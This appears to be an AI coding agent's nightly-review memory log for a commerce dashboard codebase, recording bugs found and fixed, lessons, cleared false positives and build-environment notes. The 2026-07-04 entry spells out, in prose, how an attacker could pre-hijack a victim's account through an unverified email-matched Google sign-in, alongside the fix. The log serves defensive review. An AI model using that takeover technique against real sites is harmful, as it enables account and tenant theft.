resettable Peak & Pine shop, calibration prelock/hourly-recompute/too_aggressive rule writers (#302
region), SKU→dedicated-campaign autopilot (#302), Home redesign (#306–#309: agent-first landing,
progressive first-paint, prompt→chat handoff). Fanned out **4 read-only bug-hunters** by cluster
(onboarding/auth · demo/seed · calibration/autopilot money-path · Home/dashboard UI). 2 → NONE
(verified clean/hardened); 1 real bug found + fixed; 1 real-but-not-surgically-fixable finding surfaced.
Shipped **PR #311** (draft), branch `fix/nightly-2026-07-05`, single commit `5f2e0fd`.

- **Companion nightly PR #310 (author Mezoh, branch `nightly-review/2026-07-05`) was GENUINE this time**
  (base sha == our `main` `89059ad`; triage covered the real window — unlike #299 on 2026-07-04). It
  fixed 4 defects: demo-reset `sku_reorder_belief` (table has NO migration → PGRST205 wipe throw, breaks
  ALL demo-reset); `calibration/reject.server.ts` $0-impact cap flooring to 1¢ and bricking a pair;
  `dedicated-campaign.server.ts` empty/absent read returning 0 (fail-open) instead of null;
  `dashboard.store.preview.tsx` loader shipping the internal `shop_id` UUID to the browser. **Did NOT
  duplicate these** — reviewed all 4 (correct, well-scoped; guards both RPC + fallback cap paths;
  DTO-only preview) → posted NONE, and hunted for what #310 MISSED. Same playbook as 2026-07-03 with #273.

### Bug fixed tonight — decision-deck batch approve double-submits a reversible money action
- **`app/components/dashboard/screens/Dashboard.tsx`** (Home decision deck, landed via `2d4bdd6`/#306).
  A batch only starts when there is NO current card (`showBatch = !current && …`). But `approveBatch`
  dismisses items one-at-a-time INSIDE its loop (`setDismissed` after each `await executeAction`); each
  dismissal re-runs the fold `useMemo`, which unfolds the batch once `eligible.length < 2`. So on the
  PENULTIMATE dismissal the LAST still-in-flight item pops back out as `current = cardQueue[0]` and
  renders a full card with a LIVE Approve button (`approving` is null during a batch run — the batch
  tracks `batchLeft`, not `approving`), WHILE the loop is still awaiting that same item's executeAction.
  A merchant click → `executeAction(sameAlert, sameAction)` fires a 2nd time → the reversible money
  action (reduce_campaign_budget / pause_campaign) runs twice. Fix (one line): gate `current` on
  `batchLeft` — `const current = batchLeft !== null ? null : (cardQueue[0] ?? null)` — freezing the deck
  during a batch so no live single-approve card can leak. `approveBatch` was already re-entrancy-guarded;
  the batch button is already `disabled={batchLeft !== null}`. No test asserted the old behavior.
- **Lesson (loop-mutates-derived-state UI race):** when a sequential async loop calls a state setter
  (`setDismissed`) between awaits AND a `useMemo`/derived value keys off that state to decide what's
  interactive, each iteration re-derives mid-flight and can surface an item the loop is still processing
  as a fresh, clickable control → double-submit. Freeze the interactive surface for the loop's duration
  (guard on the in-progress flag) or batch the dismissals into a single post-loop setState.
- **Dashboard parity:** `app/components/dashboard/screens/*` IS the dashboard surface (rendered by
  `app/routes/dashboard.$.tsx`; per CLAUDE.md the repo's `dashboard.*` routes ARE the dashboard). So a
  fix here lands on the dashboard directly — there is NO separate mirror to update for these components.
  (A fixer subagent mis-flagged this as a parity TODO; it isn't one.)

### Found but NOT auto-fixed (surfaced for a product/maintainer decision) — do act on this if it recurs
- **`supabase/migrations/20260703200000_prelock_no_brainer_autonomy.sql`** (`9908ab3`/#302) re-enables
  the three no-brainer `pause_campaign` pairs for every row `where not autonomy_enabled and not
  merchant_disabled and not exists(muted_pair)`. But the Live-Engine off-switch (`setPairAutonomy` in
  `app/lib/calibration/live-engine.server.ts`) writes ONLY `autonomy_enabled`; **`merchant_disabled` is
  never set true by any current writer** (its sole write, `calderyn.server.ts:1573`, only clears it to
  false on unmute). So a merchant who enabled→disabled a no-brainer during the ~1-week Slice C window
  sits at `autonomy_enabled=false, merchant_disabled=false, no muted_pair` — which this migration flips
  back to true, silently resuming autonomous campaign pausing they turned OFF, on the money path. The
  migration header's "respects explicit merchant signals" is false for the ONE signal that is the
  off-switch. **Why not fixed:** it's a one-shot SQL migration already landed/applied — editing it does
  nothing on migrated DBs and violates repo migration-immutability; after the flip affected rows are
  indistinguishable from freshly-enabled, so no forward migration can identify/repair them. The LIVE seed
  path `seedShippedAutopilotFeatures` (`supabase.server.ts`) is SAFE — upserts with
  `ignoreDuplicates: true`, so re-auth does NOT re-flip merchant-off rows; only the historical one-shot
  migration bites. Documented in #311's "Attempted — unresolved" section for a maintainer call.
- **Lesson (boolean-default vs explicit-off collision):** a single boolean column can't distinguish
  "never set (schema default)" from "user explicitly turned off." Any backfill/seed that flips
  `false → true` on such a column reverts explicit opt-outs. When a feature adds a second-gate boolean
  (default false) that a UI toggle also writes, the safe backfill must key off a distinct opt-out marker
  or a nullable tri-state (`NULL`=never-set), NOT `not <flag>`.

### False positives cleared this run (do NOT re-flag)
- **Signup onboarding (#305):** `needsOnboarding = userId != null && onboardedAt == null` correctly
  exempts shop sessions (userId null); gate runs before verify in both `requireVerifiedSession` and
  `requireDashboardSession`; onboarding route loader is read-only + session-gated, action re-checks
  session/rejects shop sessions/rate-limits/validates FormData; `normalizePhone`/`isReferralSource`
  reject bad input without throwing; migration backfills `onboarded_at = now()` for pre-existing users
  (never retro-forced), new rows default NULL; `.select` includes `onboarded_at` (no snake↔camel gap).
- **Demo showcase / seed:** demo-reset derives shop only from `session.shopId` (no forgeable param),
  `requireSameOrigin` + rate-limit, `resetDemoShowcase` re-reads `shops.demo_mode` and throws
  `not_demo_shop` BEFORE any wipe (fail-closed); service-role client so no RLS silent no-op; every
  `SHOWCASE_WIPE_ORDER` table (except the #310-fixed `sku_reorder_belief`) exists in a migration or the
  vendored engine schema and carries `shop_id`; FK/wipe ordering children-before-parents, cascade-only
  tables intentionally omitted; seed enum/CHECK values valid, no future stamps, `variant_dim.id ==
  sku_dim.id` intentional (promote preserves id).
- **Calibration/autopilot (rest of cluster):** mu-override `min(policyMu, muOverride)` + `1-0.5·mu`
  strictly shrink; min_spend floor `spend+1` vetoes correctly; day-anchor recompute + cron status codes
  (502 shop-read, 500 real error, organic errors non-fatal) correct; SKU→dedicated-campaign shop-scoped,
  pause-only, fail-closed on unverifiable spend.
- **Home UI (rest):** boot generation guard (`loadGen` ref + `fresh()`) drops stale slices, no
  cross-tenant seed; prompt→chat handoff queue `n`-keyed, drained one-at-a-time, no drop/double-send;
  `live-engine-page.server.ts` displayTarget resolves from loaded rows (no N+1), unresolvable → "" with
  text fallback; TickGauge + motion effects hooks-order clean. (Known cosmetic, NOT fixed: `approveBatch`
  not bumping `handledSession` drifts the "X of Y" total — #310 flagged it, left intentionally.)

### Gate / environment
- `npm ci` again WORKS (exit 0), Node v22.22.2. Full gate on the fix tree (`5f2e0fd`): setup 0 ·
  typecheck 0 · lint 0 (13 pre-existing warnings, 0 errors, none on the touched file) · build 0
  (verifier: **243** client files clean) · vitest **558 files / 4028 passed / 12 skipped / 0 failed**.
- **CI-status read via GitHub MCP `pull_request_read get_status` returns 403 "Resource not accessible by
  integration"** in this env — cannot poll combined status. Rely on the `<github-webhook-activity>`
  events for CI failures instead (they wake the session); a green run is confirmed by the local gate.
- Vercel bot posts a routine "Building"→"Ready" preview-deploy comment on every nightly PR — NOT a
  review comment, no action.

## 2026-07-04

### Triage — HUGE 24h window (~80 commits, PRs #275–#300); a companion nightly PR had BOGUS triage
Window = everything merged 2026-07-03 (auth redesign #275/#276/#277/#279/#289/#291/#296/#297/#298;
buyer accounts #1b; Step-10 refunds/relink/RLS/owned-asset CDN #281–#287; tenant storefront #278;
AI store generator + product flow #292/#293/#294/#295/#300). Fanned out **5 read-only bug-hunters**
by cluster: buyer-accounts · refunds/relink/promote/assets · dashboard auth/OAuth/session/CSP ·
store-generator/AI-product-flow · RLS/tenant-read-lane/migrations. 4 → NONE (verified clean, hardened);
1 real bug found + fixed. Shipped **PR #301** (draft), branch `fix/nightly-2026-07-04`.

- **CAUTION — a companion nightly PR #299 (author Mezoh, branch `nightly-review/2026-07-04`) existed at
  run start but its triage was WRONG:** its body claims "zero commits in the last 24h, latest is
  9f49b77 4 days ago" and it therefore reviewed only OLDER cron/webhook/rate-limit modules — it never
  looked at tonight's ~80-commit landed surface. So unlike 2026-07-03 (where companion #273 genuinely
  covered the window), this run I could NOT lean on #299 for coverage; I reviewed the whole window
  myself. **Lesson:** don't trust a companion PR's "zero commits" claim — re-derive the window from
  `git log origin/main --since` yourself. (Also: the local checkout started on a STALE `main` ref /
  detached HEAD; always `git fetch origin main` and branch off `origin/main`, not the local ref.)
- Reviewed #299's 7 fixes separately (cron.detect/ingest/ingest-ads/gdpr/ingest-quickbooks error-swallow
  → 500; rate-limit XFF leftmost→rightmost/x-real-ip; remediation-guard null-cap→5). All 7 correct, no
  new defects, changed test asserts the right contract. Posted NONE (no comment).

### Bug fixed tonight — account pre-hijacking via unverified federated (Google) merge
- **`app/routes/dashboard.auth.google_.callback.tsx` Path 2** (the un-nested callback newly created by
  #298 / `1f84622`, in-window). After Google verifies the email, Path 2 linked the Google `sub` to ANY
  pre-existing local account matched **only by email string** and created a session — with NO check the
  local account had proven email ownership. Exploit: attacker `/dashboard/signup` with victim's email +
  attacker password creates an UNVERIFIED `users` row + attacker-owned tenant (`createUser` does not set
  `email_verified`); victim later "Continue with Google" → Path 2 finds the attacker row by email, binds
  the victim's Google identity, signs the victim INTO THE ATTACKER'S TENANT with the attacker's password
  surviving → account/tenant takeover. Fix: `findUserByEmail` now also returns `emailVerified`; Path 2
  refuses the silent link+session when the match is unverified (no `setGoogleSub`, no session; redirect
  `/dashboard/signin?error=verify_email_first`, GOAUTH cleared). Paths 1 & 3 untouched; legit
  verified-password→Google link still works. Added `messages.ts` copy + a test asserting the unverified
  match is refused.
- **Lesson (federated-merge pre-hijack):** any OAuth/SSO callback that auto-links a verified federated
  identity into a pre-existing local account BY EMAIL must gate on the local account being email-verified
  (or require a password proof). If password signup creates a matchable row BEFORE email verification
  (as here — `createUser` omits `email_verified`), the by-email merge is a pre-hijacking vector. Check
  every provider callback that calls a `findUserByEmail`→`setSub`→`createSession` sequence.

### Second fix — landed-in-window lint error breaking `npm run lint` for the whole repo
- **`app/routes/__tests__/dashboard.store.preview.test.tsx`** (landed via #300 / `da74383`): the
  module-under-test `import { loader }` sat BELOW the `vi.mock` calls → `import/first` ESLint error →
  `npm run lint` exit 1 repo-wide (a gate + CI step). Fix: hoist the import to the top block —
  behavior-preserving because Vitest hoists `vi.mock` above imports and the factories reference only
  `vi.hoisted` vars (test still 4/4). **Lesson:** `npm run lint` returns exit 0 despite 13 pre-existing
  WARNINGS (it's not `--max-warnings=0` globally), so a non-zero lint means a real ERROR was newly
  landed — grep the diff for it; the `import { X } from "../route"` after `vi.mock` pattern is the usual
  culprit and is always safe to hoist.

### Open-PR review
- **#299** (companion nightly): 7 fixes all verified correct → NONE (no comment). See caution above re
  its bogus triage window.
- **#267** (RR7 migration, still a DRAFT, unchanged since 2026-07-03 05:21): NOT re-reviewed — memory's
  2026-07-03 entry already reviewed it in full and posted the one real finding (the `app.settings` CSV
  5MB cap now running AFTER `request.formData()` buffers the whole body). Re-posting would be duplicate
  noise. If it changes, re-review.

### Gate / environment
- `npm ci` again WORKS here (exit 0), Node v22.22.2. Full gate on the final fix tree: setup 0 ·
  typecheck 0 · lint 0 (13 pre-existing warnings, 0 errors) · build 0 (verifier: **244** client files
  clean) · vitest **550 files / 3938 passed / 12 skipped / 0 failed**. Flaky
  `linkedin-connection.test.ts` passed this run.
- Build emits a pre-existing esbuild CSS `[WARNING] Expected "(" but found "print"` — cosmetic, not a
  failure, ignore.

### False positives cleared this run (do NOT re-flag)
- **Buyer accounts #1b** (session/magic-link/identity/account/payment-methods + storefront.account.* +
  checkout prefill): every read/write threads shop_id + session-derived buyer_id; `__Host-` cookie
  HttpOnly/Secure/SameSite=Lax; 256-bit CSPRNG tokens, single-use magic link via atomic
  `consumed_at IS NULL`, expiry enforced; saved cards store only Stripe display fields (brand/last4/exp),
  never PAN/CVV, `si.customer` ownership-checked; GDPR delete shop+buyer scoped, Stripe best-effort
  logged, DB throws; composite FK `(shop_id,buyer_id)→buyer_dim`. Clean.
- **Step-10 refunds/relink/promote/assets:** refund over-refund blocked by signed-ledger sum + FOR-UPDATE
  `record_refund_ledger` + Stripe backstop; double-refund triple-guarded (action dedup + Stripe
  idempotency key + `unique(stripe_event_id,kind)`); refund correctly NON-undoable (undoAction boundary +
  `v_audit_view` exclusion); relink buyer lookup shop-scoped + composite FK blocks cross-tenant link;
  promote inserts `on conflict do nothing` + shop-filtered + `distinct on` media (idempotent); asset
  upload session+same-origin+rate-limited, key `${shopId}/${randomUUID()}.${ext}` (no traversal),
  magic-number sniffed, size double-capped. Clean.
- **Store generator / AI product flow:** no `.server` leak into client bundles (Anthropic key confined to
  `anthropic.server`); all publish/write paths thread `session.shopId` from `requireDashboardSession`,
  cross-tenant guarded (`ownedCollectionIds`, matched-row checks); listing-draft boundary JSON-guarded +
  clamped + tool-schema-forced + `sanitizePlan`; screen-cache (b2516a1) is a per-browser module-level Map
  written only from client effects, account switch does full navigation → no cross-tenant seed;
  AI-unavailable render is defensive (optional-chaining + fallbackDoc), no null-deref. Clean.
- **RLS / tenant read lane / Step-10 migrations:** `getTenantSupabase` mints an HS256 `app_web`
  (NOBYPASSRLS) JWT bearer — NOT the service-role key; fail-closed (no GUC → zero rows). Migration
  "duplicate-looking pairs" resolved by `d080286` (only one copy of each object exists). `160000`
  app_web→SELECT-only + `170000` security_invoker guard self-test on apply; `v_audit_view.trigger_reason`
  exists since a 2026-06-15 migration (no ordering bug). `verify-rls-enforcement.mjs` uses genuine
  `SET ROLE app_web`, not the bypass key. Clean. (Sub-threshold, NOT bugs: verify script's per-table
  positive control only covers `product_dim`; `app_web` role is an environmental precondition never
  `CREATE ROLE`'d in-repo so a fully-fresh `db reset` of this repo alone would fail — both pre-date
  Step 10.)

## 2026-07-03

### Triage — big 24h window, companion nightly PR already existed
Window = everything merged 2026-07-02 (PRs #257, #260–#266, #268–#272; ~55 commits /
212 files: Stripe Connect payouts, full dashboard redesign, calibration
organic-learning, storefront checkout/analytics, security hardening). **A companion
nightly PR #273 (author Mezoh, branch `nightly-review/2026-07-03`) already existed at
run start** and fixed 5 landed bugs (media delete ordering; cron.calibration-recompute
500-escalation; ACP unsupported-currency guard; ACP pre-charge session-wedge /
`releaseAcpSessionClaim`; `cart_add` product-vs-variant id) + listed 4 deferred. Did
NOT duplicate it — hunted for what it MISSED. Fanned out 4 read-only bug-hunters
(payments/billing #269 · calibration #261–266 · security #257 + new commerce/campaign
server code #272 · dashboard connections/IA #268/#270). 3 → NONE (verified clean); 1
real bug found + fixed.

### Bug fixed tonight — disconnect leaves OAuth credential encrypted-at-rest
- **`app/lib/calderyn.server.ts` `integrations.disconnect()`** deleted the
  `integration_credentials` row ONLY for a hardcoded `SHIP_COST_CRED_KINDS` set — but
  `meta_ads`/`google_ads`/`tiktok_ads`/`quickbooks` ALSO store their encrypted OAuth
  token in the same `integration_credentials.access_token_encrypted` column (see
  `auth.{meta,google,tiktok,quickbooks}.$.tsx` upserts). So after a Disconnect the
  `shop_integrations` row was gone (UI shows disconnected, cron stops) but a
  still-valid token stayed at rest indefinitely (Google refresh never expires; Meta
  ~60d; QBO ~100d; TikTok weeks). The inline comment claiming ad/QBO tokens live as a
  bytea on `shop_integrations` was FACTUALLY WRONG. Fix: make the credential delete
  UNCONDITIONAL on the resolved `kind` (keyed `shop_id`+`kind` → credential-less
  providers match 0 rows, harmless). Shipped **PR #274**. Helper predates the window,
  but PR #268 (`77fdc64`) newly routed dashboard disconnects into it.
- **Lesson (allowlist-vs-writers):** when reviewing a delete/cleanup gated by a
  hardcoded `kind`/type allowlist, cross-check it against EVERY writer of that table —
  an inline comment asserting where a token is stored is NOT proof; grep the actual
  upsert sites. Same shape as last night's "cross-check column names against the
  migration DDL, not the test mock" lesson.
- The unit test `integrations-connect.test.ts` had a case asserting the OLD buggy
  contract ("leaves an OAuth provider's credential untouched") — updated to assert the
  credential IS deleted. (Recurring: green tests can encode the wrong contract.)

### Open-PR review
- **PR #273** (companion nightly, 5 fixes): reviewed all 5, all correct. `releaseAcpSessionClaim`
  (fix #4) canNOT reopen after a successful charge (charge is OUTSIDE the try/catch);
  soft-error routing (fix #2) still 500s real recompute throws; no reader expected a
  variant id in `storefront_event.product_id`. Posted NONE (no comment).
- **PR #267** (DRAFT: React Router 7 migration, supersedes merged #264): `response.server.ts`
  is byte-parity with Remix `json()`; `EmbeddedAppProvider` composition OK (RR7
  `AppProvider` prop is `embedded`, does NOT wrap Polaris — no double provider). Found
  ONE real regression → posted a review comment: **`app/routes/app.settings.tsx` CSV 5MB
  cap now runs AFTER `request.formData()` buffers the whole body** (undici has no size
  limit), losing the streaming `maxPartSize` DoS protection `unstable_createMemoryUploadHandler`
  gave on main. Fix = reject on Content-Length up front / stream with a size cap.

### Gate / environment — IMPORTANT UPDATE (supersedes 2026-07-01 offline recipe)
- **`npm ci` WORKS in this remote-execution environment** (exit 0, ~37s). The proxy
  here (CA bundle `/root/.ccr/ca-bundle.crt`) lets `@prisma/engines` download its
  binary fine — the whole 2026-07-01 curl-the-engine offline recipe is NOT needed
  here. Just `npm ci`. (Node is v22.22.2 in this env.) Keep the offline recipe only as
  a fallback if the environment changes back.
- Full gate on the fix branch: setup 0 · typecheck 0 · lint 0 (13 pre-existing
  warnings, none on touched files) · build 0 (verifier: 227 client files clean) ·
  vitest 522 files / 3715 passed / 11 skipped / 0 failed.
- **Flaky test:** `app/lib/social/__tests__/linkedin-connection.test.ts` (randomized
  state-tamper assertion) failed ONCE then passed on re-run. Not a regression — re-run
  if it fails in isolation.

### CI gotcha UPDATE — "Python engine tests" is GREEN now
- The fork's **"Python engine tests" GitHub Action, previously RED on every PR**
  (the `v_audit_view` / `trigger_reason` schema-ordering bug in the 2026-06-21
  migration), is now **passing** on #274's checks — it appears to have been fixed
  upstream. Stop treating a red Python-engine job as automatically pre-existing/ignorable;
  re-check. The real gate is still **"Node gate"** (the CI job that runs typecheck/lint/build/vitest).

### False positives cleared this run (do NOT re-flag)
- Stripe Connect fee/destination/idempotency wiring (#269): fee bps+flat rounded &
  clamped to [0,amount], omitted at 0, routes only to fully-onboarded accounts,
  per-order idempotency key with a distinct `_platform` fallback key, card declines
  never trigger the destination-param fallback retry. Clean.
- Calibration batch/N+1 rewrite (#265): bulk `action_pair_priors()` semantically
  identical to the retired per-pair fn; cache `upsert` only updates rows that existed
  in step 1; single-threaded cron worker pool → no torn shared counters. Clean.
- "Asks twice" no-brainer mute (#266): both `i_handle_this` surfaces handle the 409
  `CONFIRM_REQUIRED` and re-post `confirmed=true`; the Autopilot reject surface never
  offers `i_handle_this`, so it can't wedge. Clean.
- New analytics `commerce.server.ts` / `campaign-draft.server.ts` (#272): all routes
  `requireDashboardSession`, `shop_id` threaded on every read/write, Supabase errors
  thrown not swallowed, `ilike` passed as a discrete supabase-js filter param (no
  PostgREST injection), aggregate math (net = gross − refund) correct. Clean.

## 2026-07-02

### Triage result — LANDED code clean, zero fixes needed
24h window `0c4ba8b` back through the day's merges (PRs #241, #245–#250, #252–#255).
Read every substantive diff. **No high-confidence correctness bug found; no fix
branch/PR opened.** All of tonight's landed work is fresh but visibly
adversarially-reviewed (explicit edge-case handling, fail-closed logic,
idempotency). Reviewed and cleared:
- **`storefront/money.ts` + `meta.ts`** (faeaa8e, PR #253): locale pinned to en-US
  via cached `Intl.NumberFormat` to kill SSR/hydration mismatch #425; per-currency
  cache. Correct.
- **`storefront/settings.server.ts`** (80f7ebc, PR #255): settings-less shop falls
  back to `shops.display_name` then "Your store" instead of the demo label. Correct.
- **`order/cart.server.ts`** (faeaa8e): `assertPersistableShop` blocks the
  `DEMO_SHOP_ID` sentinel from the uuid cart tables on build/add/price. Correct;
  route-level demo guards mirror it (cart/checkout/PDP loaders+actions).
- **`storefront/shop.server.ts`** (b7bd823, PR #248): real tenant resolution,
  `SLUG_RE`-validated `or()` (no PostgREST filter injection), 60s TTL hit+miss cache
  w/ FIFO eviction, uninstalled shops excluded. Correct.
- **`storefront/catalog.owned.server.ts`** (6b213f2, PR #252): availability now sums
  the ledger `available` column (matches `inventory_reserve()`), chunked+paged past
  the 1000-row cap, ledger-less variants keep the editor `inventory_on_hand`
  fallback (`ledgerSellable ?? …`). Correct — a variant with ledger rows summing to 0
  correctly reads sold-out; only *no* rows → fallback.
- **`ship-cost/runner.server.ts`** (6acfe8f, PR #246): fixes /cron/ingest 504 by
  diffing in-memory + set-based RPC batches; `fetchAllRows` now THROWS on page error
  (was silently returning partial); `asError` unwraps PostgREST `[object Object]`;
  sku_pnl now writes a zero over a stale nonzero cost (old `=== 0` skip left stale
  margins). Correct.
- **`cutover/go-live.server.ts`** (30c3d61 + f3cb0c2, PR #247/#249): value-parity
  gate runs the drift sweep only after cheap structural checks pass; Shopify
  unreachable FAILS CLOSED; native shop passes; demo shops exempted via
  `isShowcaseShop` (fails safe toward real shop). Correct.
- **`dashboard.api.agentic._index.tsx`** (e5b928b, PR #250): the loader was rewritten
  to scope the client list to the shop's own non-revoked `mcp_tokens` — this
  **supersedes** last night's `client_name` column fix AND resolves the
  "not shop-scoped" item that 2026-07-01 left as a product/privacy question. Uses
  `client_name` correctly. The global-registry note below is now moot for this route.

### Open-PR review
- **PR #235** (last night's own nightly fixes, still UNMERGED): posted one review
  comment. Found a real **liveness bug in the ACP double-charge fix**:
  `claimAcpSessionForCompletion` flips `open→completing`, then cap/place/charge run
  with **no try/catch and no rollback** — a transient failure wedges the session in
  `completing` forever (retries hit `409 in_progress`; nothing sweeps a stale
  `completing`). Suggested persisting `orderId` after place (before the idempotent
  charge) so retries resume at charge. Also flagged its `edccc80` agentic commit as
  now-redundant vs merged #250. **IMPORTANT: #235's token-reuse + ACP double-charge +
  swallowed-error fixes are STILL LIVE on main (PR never merged)** — worth a nudge to
  merge (minus edccc80). PRs #47 (presentation) and #38 (test-only) are ~1mo stale,
  low-risk → NONE, no comment.

### Gate note
- Ran **no** eval gate this run: zero code changes were made (no landed bug to fix),
  so there was nothing to typecheck/build/test. The prisma-offline install recipe
  below was therefore not exercised tonight — assume still valid.

## 2026-07-01

### Bug fixed tonight
- **`app/routes/dashboard.api.agentic._index.tsx`** selected/read DB column `name`
  from `mcp_oauth_clients`, but the real column is **`client_name`** (see
  `supabase/migrations/20260608120000_mcp_oauth_clients.sql`). Against real
  Postgres/PostgREST, selecting an undefined column → error `42703` → loader
  throws → the whole Agentic Channel dashboard screen **500s on first load**.
  Source: commit `5677bc5` (PR #227, buy-in-chat P4). Fix: read `client_name`;
  DTO output key stays `name`. Shipped in PR #234.
- **Lesson (mock-hides-bug):** the route's unit test used a Supabase mock whose
  `.select()` ignores its args and returns a fixture keyed `name` — so the test
  *passed against the buggy code* and never caught the wrong column. When
  reviewing Supabase/PostgREST queries, **cross-check selected column names
  against the migration DDL, not the test mock.** A green test does not prove the
  column exists.

### Recurring bug pattern — "write-then-blank round-trip drop"
When a feature adds newly-persisted columns, the **LIST/GET loader `.select(...)`
frequently is NOT updated**, so the new fields render blank on reopen and can be
zeroed on the next save/onBlur. Seen repeatedly:
- PR #232 (owned-shipping): `dashboard.api.catalog.locations._index.tsx` list
  loader still selected `id,name,priority,lat,lng` after ship-from address fields
  were added → address blanks on reopen. Also a **snake_case↔camelCase** gap
  (`postal_code` DB vs `postalCode` VM). Commented on #232.
- Previously fixed on the product loader in `558c869` (8 shipping fields).
**Review action:** whenever a PR adds persisted columns, grep every loader that
reads that table and confirm the new columns are in the `select` AND mapped to
the VM's camelCase shape.

### False positives — do NOT re-flag
- `dashboard.api.agentic._index` lists `mcp_oauth_clients` filtered only by
  `commerce_scope=true` with **no shop scoping**. This is NOT a cross-tenant leak:
  `mcp_oauth_clients` is a **global registry** (no `shop_id`; `commerce_scope` and
  `spend_cap_cents` are per-*client* global config). Nothing to scope by.
  (Whether every merchant should see the global client list is a product/privacy
  question, not a correctness bug — don't "fix" it by inventing a shop join.)
- **Owned catalog (Slice 1, PR #229/1452045)** and **inventory ledger
  (Slice 2, PR #230/be43b38)** were triaged clean this run — heavily hardened via
  prior adversarial rounds (shop-scoped writes w/ row-count checks, FOR-UPDATE
  atomic stock fns, idempotent commit/release, cross-tenant link intersection).
  Don't re-litigate the same write-safety/shop-scoping angles.
- Commerce/ACP guardrail + signature + charge + env-gate (PR #227/#228) reviewed
  clean: guardrail denies missing/unregistered clientId, allows registered,
  spend_cap 0 = unlimited (intentional); ACP routes 404 when `ACP_ENABLED!=="true"`.

### Gate / environment gotchas (IMPORTANT — saves ~30min next run)
- **`npm ci` fails in this sandbox.** The `@prisma/engines` postinstall downloads
  engine binaries via Node's HTTP client, which **ignores `HTTPS_PROXY`** →
  `ECONNRESET`/"aborted". Registry itself is fine (it's in the proxy noProxy list).
- **Working install recipe:**
  1. `npm ci --ignore-scripts` (populates node_modules, skips the failing prisma
     engine download).
  2. Download engines via **curl** (curl honors the proxy — the prisma CDN
     `binaries.prisma.sh` is proxy-reachable):
     `BASE=https://binaries.prisma.sh/all_commits/<ENGINE_HASH>/debian-openssl-3.0.x`
     `curl -o libquery.gz $BASE/libquery_engine.so.node.gz`
     `curl -o schema.gz  $BASE/schema-engine.gz` ; gunzip both.
     Place in `node_modules/@prisma/engines/` as
     `libquery_engine-debian-openssl-3.0.x.so.node` and
     `schema-engine-debian-openssl-3.0.x` (chmod +x).
  3. Generate offline (env vars REQUIRED — bare `prisma generate`/`npm run setup`
     still hits the network even with engines present):
     `PRISMA_QUERY_ENGINE_LIBRARY=<path> PRISMA_SCHEMA_ENGINE_BINARY=<path> \`
     `PRISMA_CLI_QUERY_ENGINE_TYPE=library npx prisma generate`
     Keep these 3 env vars exported for the whole gate (setup/typecheck/build/test).
  - prisma 6.19.3 → ENGINE_HASH = `c2990dca591cba766e3b7ef5d9e8a84796e47ab7`.
    Target `debian-openssl-3.0.x` (Ubuntu 24.04, openssl 3). Re-derive the hash
    from `@prisma/engines-version/package.json` if the prisma version changes.
- **Never mask exit codes with a pipe.** `npm ci | tail` reports `tail`'s exit
  (0) even when npm failed. Use `cmd >log 2>&1; echo EXIT=$?`.
- **TS baseline noise:** with a broken/incomplete node_modules, `tsc` emits
  `TS2688` (missing `@remix-run/node`/`vite/client` type defs) and a `baseUrl`
  `TS5101` deprecation error. Both vanish once install completes. TS resolves to
  5.9.3 via the lock; tsconfig has no `ignoreDeprecations` and it's fine once deps
  are present. So TS2688/TS5101 at baseline ⇒ suspect node_modules, not code.
- Clean-tree full gate this run: setup 0 · typecheck 0 · lint 0 (13 pre-existing
  warnings, none on touched files) · build 0 (client-bundle verifier: 206 files
  clean) · vitest 478 files / 3295 passed / 11 skipped / 0 failed.

### CI gotcha (do NOT chase on nightly PRs)
- The fork's **"Python engine tests"** GitHub Action is RED for *every* PR
  (pre-existing). It applies the SQL engine-schema migrations to a Postgres
  container and dies on **`tests/engine/schema/migrations/20260621130000_autonomous_undo_window.sql`**:
  `ERROR: column aa.trigger_reason does not exist` — `v_audit_view` references
  `action_audit.trigger_reason` before it's added (schema-ordering bug in a
  2026-06-21 migration). Not a per-PR regression; local vitest is the real gate.
  Worth a dedicated fix someday, but out of scope for nightly correctness patches.
